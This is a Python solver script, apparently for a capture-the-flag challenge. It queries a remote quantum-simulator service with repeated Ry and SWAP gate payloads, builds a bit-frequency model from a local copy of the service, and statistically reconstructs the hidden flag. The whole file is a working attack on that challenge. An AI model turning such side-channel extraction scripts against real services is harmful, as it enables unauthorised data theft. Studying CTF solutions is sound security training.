#!/usr/bin/env python3

import os
import sys
import json
import math
import string
import socket
import subprocess


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 17171


def interact_remote(payload):
    size = 1024
    output = b''

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(3)
        sock.connect((IP, PORT))

        sock.sendall(payload.encode())
        
        while True:
            data = sock.recv(size)

            if len(data) <= 0:
                break

            output += data

    return output


def interact_local(payload):
    args = ['dotnet', './deploy/service/ZN.Runner.dll']

    with subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
        stdout, _ = process.communicate(payload.encode())
        return stdout


def split_output(output):
    lines = output.replace(b'>>> ', b'').decode().split(os.linesep)[:-1]

    for line in lines:
        yield bytes.fromhex(line)


def generate_payload(repeat):
    operation = 'Ry ' + str(-math.pi / 2)
    operations = []

    for i in range(1, 8):
        operations.extend([
            'SWAP', str(i),
            operation,
            'SWAP', str(i),
        ])

    text = operation + ' ' + ' '.join(operations)
    return (text + os.linesep) * repeat + os.linesep


def calculate_counters(repeat, interact):
    bitsize = 8
    payload = generate_payload(repeat)
    counters = []

    output = interact(payload)

    for data in split_output(output):
        for i, byte in enumerate(data):
            bits = bin(byte)[2:].zfill(bitsize)
            
            if len(counters) <= i:
                counters.append([0] * bitsize)

            for k, bit in enumerate(bits):
                counters[i][k] += int(bit)

    return counters


def write_flag(text):
    filename = 'flag.txt'

    with open(filename, 'w') as file:
        file.write(text)


def get_model(alphabet, repeat):
    write_flag(alphabet)

    counters = calculate_counters(repeat, interact_local)

    return dict((symbol, counter) for symbol, counter in zip(alphabet, counters)) 


def save_model(model):
    filename = 'model.json'

    with open(filename, 'w') as file:
        json.dump(model, file)


def load_model():
    filename = 'model.json'

    with open(filename, 'r') as file:
        return json.load(file)
        

def counters_equal(counter1, counter2, eps=100):
    for x, y in zip(counter1, counter2):
        if abs(x - y) > eps:
            return False

    return True


def get_possible_flags(model, counters):
    possible_symbols = []

    for counter in counters:
        part = []

        for symbol in model:
            if counters_equal(model[symbol], counter):
                part.append(symbol)

        possible_symbols.append(part)

    max_index = max(map(len, possible_symbols))

    for index in range(max_index):
        flag = ''

        for part in possible_symbols:
            if len(part) > index:
                flag += part[index]
            else:
                flag += part[0]

        yield flag


def main():
    repeat = 1000
    alphabet = string.ascii_letters + string.digits + '{}_'

    # model = get_model(alphabet, repeat)
    # save_model(model)
    model = load_model()

    counters = calculate_counters(repeat, interact_remote)
    
    for flag in get_possible_flags(model, counters):
        print(flag)


if __name__ == '__main__':
    main()
